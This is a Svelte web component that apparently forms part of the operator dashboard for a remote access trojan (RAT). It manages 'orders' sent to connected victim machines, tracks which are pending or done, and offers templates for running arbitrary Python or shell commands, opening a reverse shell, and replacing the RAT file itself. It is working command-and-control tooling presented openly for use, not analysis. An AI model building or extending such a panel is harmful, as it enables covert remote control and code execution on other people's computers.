<script lang="ts">
  import { server_config, get_auth_header} from "./auth";
  import type { MachineType } from "./types/MachineType";
  import type { OrderType } from "./types/OrderType";

  let { order=$bindable(), selected_machines, machines }:
  {
    order: OrderType,
    selected_machines: Record<string, boolean>,
    machines: Record<string, MachineType>
  } = $props();

  let code = $state(JSON.stringify(order.data, null, "\t"));
  let saved = $state(true);

  async function send_to_selected(force=false) {
    for (const [machine_id, selected] of Object.entries(selected_machines)) {
      if (selected) {
        if ((force || !order.done.includes(machine_id)) && !order.pending.includes(machine_id)) {
          order.pending.push(machine_id);
        }
      }
    }
    await fetch(server_config.url + "api/orders/" + order.id, {
      method: "PATCH",
      headers: get_auth_header({
        "Content-Type": "application/json"
      }),
      body: JSON.stringify({pending: order.pending}),
    })
  }
</script>

<details>
  <summary><h3>{order.name} | {order.id}</h3></summary>
  <br>
  <button title="Send to selected machines that haven't already completed this order" onclick={async() => await send_to_selected()}>Send to selected</button>
  <button title="Send to selected machines even if they already completed this order" onclick={async() => await send_to_selected(true)}>Force send to selected</button>
  <button onclick={async () => {
    await fetch(server_config.url + "api/orders/" + order.id, {
      method: "DELETE",   
      headers: get_auth_header(),
    })
  }}>Delete</button>
  <button onclick={async () => {
      await fetch(server_config.url + "api/orders/" + order.id, {
        method: "PATCH",
        headers: get_auth_header({
          "Content-Type": "application/json"
        }),
        body: JSON.stringify({name: prompt("New name: ", order.name) ?? order.name}),
      })
    }}>Rename</button>
    <br>
    <br>

    <div class="horizontal-list">
      <b>Pending: </b>
      {#each order.pending as machine_id}
        <span class='{selected_machines[machine_id] ? "selected " : ""}{machines[machine_id].connected ? "active" : "inactive"}'>{machine_id}</span>
      {/each}
    </div>

    <div class="horizontal-list">
      <b>Done: </b>
      {#each order.done as machine_id}
        <span class='{selected_machines[machine_id] ? "selected " : ""}{machines[machine_id].connected ? "active" : "inactive"}'>{machine_id}</span>
      {/each}
    </div>

    <br>

    <label for="templates">Choose a template:</label>
    <select name="templates" id="templates" bind:value={code} onchange={() => {saved = false;}}>
      <option value={JSON.stringify({type:"python", code:"print('Hello world')"}, null, "\t")}>Python code</option>
      <option value={JSON.stringify({type:"run", code:"gnome-calculator -m advanced"}, null, "\t")}>Run command</option>
      <option value={JSON.stringify({type:"shell", host:"127.0.0.1", port:1234}, null, "\t")}>Reverse shell</option>
      <option value={JSON.stringify({type:"update", code:"REPLACE THE RAT FILE WITH THIS (DANGEROUS!!)"}, null, "\t")}>Update RAT</option>
    </select>
    <button onclick={async () => {
      try {
        order.data = JSON.parse(code);
        saved = true;
        await fetch(server_config.url + "api/orders/" + order.id, {
          method: "PATCH",
          headers: get_auth_header({
            "Content-Type": "application/json"
          }),
          body: JSON.stringify({data: order.data}),
        })
      } catch (e) {
        alert(e);
      }
    }}>Save code</button>
    <br>
    <textarea placeholder="Order JSON" bind:value={code} oninput={() => {saved = false;}} class={saved ? "saved" : "unsaved"}></textarea>
</details>
<br>

<style>
  summary h3 {
    display: inline;
  }

  .horizontal-list {
    display: flex;
    flex-direction: row;
    gap: 1em;
    overflow: auto;
    padding-bottom: 1em;
  }

  .selected {
    text-decoration-line: underline;
  }

  .active {
    color: lightblue;
  }

  .inactive {
    color: lightcoral;
  }

  .unsaved {
    color: darkred;
  }
</style>